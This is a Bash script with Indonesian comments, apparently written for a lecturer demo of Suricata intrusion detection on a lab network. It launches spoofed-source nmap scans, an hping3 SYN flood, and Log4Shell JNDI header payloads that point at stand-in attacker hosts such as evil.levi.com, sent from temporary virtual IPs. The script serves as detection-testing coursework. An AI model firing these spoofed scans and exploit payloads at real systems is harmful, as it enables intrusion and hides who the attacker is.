#!/usr/bin/env bash
# =============================================================================
#  attack_bab5_manual.sh — Cheat Sheet Serangan Manual untuk Demo Dosen
#  Author  : Levi (github.com/LEVI6957)
#  Usage   : sudo bash attack_bab5_manual.sh
#
#  Jalankan satu per satu sesuai kebutuhan demo.
#  Pastikan Suricata & dummy_web sudah berjalan di target.
# =============================================================================

# ── Warna ─────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
atk()     { echo -e "${RED}[ATK]${NC}   $*"; }
success() { echo -e "${CYAN}[✓]${NC}    $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
            echo -e "${BOLD}${BLUE}  $*${NC}"
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}\n"; }

# ── Konfigurasi ───────────────────────────────────────────────────────────────
TARGET="192.168.216.128"
IFACE="eth0"

# IP palsu untuk nmap & hping3 (tidak perlu ip addr add)
SPOOF_NMAP="192.168.216.110"
SPOOF_HPING="192.168.216.111"

# Virtual IP untuk curl (perlu ip addr add)
VIRT_IP1="192.168.216.120"
VIRT_IP2="192.168.216.121"
VIRT_IP3="192.168.216.122"

# ── Root Check ────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && echo -e "${RED}Jalankan dengan sudo!${NC}" && exit 1

# ── Cleanup otomatis saat exit ────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Membersihkan virtual IP..."
    ip addr del ${VIRT_IP1}/24 dev $IFACE 2>/dev/null
    ip addr del ${VIRT_IP2}/24 dev $IFACE 2>/dev/null
    ip addr del ${VIRT_IP3}/24 dev $IFACE 2>/dev/null
    success "Bersih!"
}
trap cleanup EXIT

# ── Banner ────────────────────────────────────────────────────────────────────
header "🔥 SURICATA ATTACK CHEAT SHEET — DEMO DOSEN"
echo -e "  Target     : ${BOLD}${TARGET}${NC}"
echo -e "  Interface  : ${BOLD}${IFACE}${NC}"
echo -e "  Spoof nmap : ${BOLD}${SPOOF_NMAP}${NC}"
echo -e "  Spoof hping: ${BOLD}${SPOOF_HPING}${NC}"
echo -e "  Virtual IP : ${BOLD}${VIRT_IP1}, ${VIRT_IP2}, ${VIRT_IP3}${NC}"
echo ""

# ── Pilih Jenis Serangan ──────────────────────────────────────────────────────
header "Pilih Serangan"
echo -e "  ${BOLD}1${NC}) nmap Port Scan          (IP: ${SPOOF_NMAP}  | no ip addr add)"
echo -e "  ${BOLD}2${NC}) hping3 SYN Flood         (IP: ${SPOOF_HPING} | no ip addr add)"
echo -e "  ${BOLD}3${NC}) curl Log4Shell x1        (IP: ${VIRT_IP1} | pakai virtual IP)"
echo -e "  ${BOLD}4${NC}) curl Log4Shell x5 SPAM   (IP: ${VIRT_IP2} | → auto BLOCK!)"
echo -e "  ${BOLD}5${NC}) curl variasi header      (IP: ${VIRT_IP3} | path berbeda)"
echo -e "  ${BOLD}6${NC}) SEMUA sekaligus          (full demo)"
echo -e "  ${BOLD}0${NC}) Keluar"
echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih [0-6]: " CHOICE

# ── Fungsi Serangan ───────────────────────────────────────────────────────────

do_nmap() {
    header "1. nmap Port Scan — dari ${SPOOF_NMAP}"
    atk "nmap -S ${SPOOF_NMAP} -e ${IFACE} -A -T5 -p 1-5000 ${TARGET} -Pn"
    nmap -S ${SPOOF_NMAP} -e ${IFACE} -A -T5 -p 1-5000 ${TARGET} -Pn
    success "nmap selesai!"
}

do_hping() {
    header "2. hping3 SYN Flood — dari ${SPOOF_HPING}"
    atk "hping3 -S -a ${SPOOF_HPING} -I ${IFACE} -p 80 -c 10 ${TARGET}"
    hping3 -S -a ${SPOOF_HPING} -I ${IFACE} -p 80 -c 10 ${TARGET}
    success "hping3 selesai!"
}

setup_virt_ips() {
    info "Menambah virtual IP..."
    ip addr add ${VIRT_IP1}/24 dev $IFACE 2>/dev/null && success "${VIRT_IP1} ditambahkan"
    ip addr add ${VIRT_IP2}/24 dev $IFACE 2>/dev/null && success "${VIRT_IP2} ditambahkan"
    ip addr add ${VIRT_IP3}/24 dev $IFACE 2>/dev/null && success "${VIRT_IP3} ditambahkan"
    sleep 0.5
}

do_curl_single() {
    header "3. curl Log4Shell x1 — dari ${VIRT_IP1}"
    ip addr add ${VIRT_IP1}/24 dev $IFACE 2>/dev/null
    atk "curl --interface ${VIRT_IP1} Log4Shell → ${TARGET}"
    curl --interface ${VIRT_IP1} \
        -H 'User-Agent: ${jndi:ldap://evil.levi.com/exploit}' \
        http://${TARGET}/ -s -o /dev/null -w "HTTP %{http_code}\n"
    success "Request terkirim dari ${VIRT_IP1}"
}

do_curl_spam() {
    header "4. curl Log4Shell x5 SPAM — dari ${VIRT_IP2} → AUTO BLOCK!"
    ip addr add ${VIRT_IP2}/24 dev $IFACE 2>/dev/null
    atk "Mengirim 5x request dari ${VIRT_IP2}..."
    for i in {1..5}; do
        curl --interface ${VIRT_IP2} \
            -H 'User-Agent: ${jndi:ldap://evil.levi.com/exploit}' \
            http://${TARGET}/ -s -o /dev/null
        echo -e "  ${RED}Hit ${i}/5${NC} dari ${VIRT_IP2}"
        sleep 0.2
    done
    success "${VIRT_IP2} harusnya sudah DIBLOK! Cek dashboard 🔒"
}

do_curl_variasi() {
    header "5. curl Variasi Header — dari ${VIRT_IP3}"
    ip addr add ${VIRT_IP3}/24 dev $IFACE 2>/dev/null

    atk "Log4Shell via X-Api-Version → /admin"
    curl --interface ${VIRT_IP3} \
        -H 'X-Api-Version: ${jndi:ldap://attacker.levi.com/a}' \
        http://${TARGET}/admin -s -o /dev/null -w "HTTP %{http_code}\n"
    sleep 0.3

    atk "Log4Shell via Referer → /login"
    curl --interface ${VIRT_IP3} \
        -H 'Referer: ${jndi:dns://callback.levi.com}' \
        http://${TARGET}/login -s -o /dev/null -w "HTTP %{http_code}\n"
    sleep 0.3

    atk "Log4Shell via X-Forwarded-For → /.env"
    curl --interface ${VIRT_IP3} \
        -H 'X-Forwarded-For: ${jndi:rmi://malicious.levi.com/obj}' \
        http://${TARGET}/.env -s -o /dev/null -w "HTTP %{http_code}\n"

    success "Variasi serangan dari ${VIRT_IP3} selesai!"
}

do_all() {
    setup_virt_ips
    do_nmap
    sleep 1
    do_hping
    sleep 1
    do_curl_single
    sleep 1
    do_curl_variasi
    sleep 1
    do_curl_spam
}

# ── Eksekusi ──────────────────────────────────────────────────────────────────
case $CHOICE in
    1) do_nmap ;;
    2) do_hping ;;
    3) do_curl_single ;;
    4) do_curl_spam ;;
    5) do_curl_variasi ;;
    6) do_all ;;
    0) echo "Keluar."; exit 0 ;;
    *) warn "Pilihan tidak valid." ;;
esac

echo ""
success "Demo selesai! Cek dashboard → http://${TARGET}:8080"
echo ""
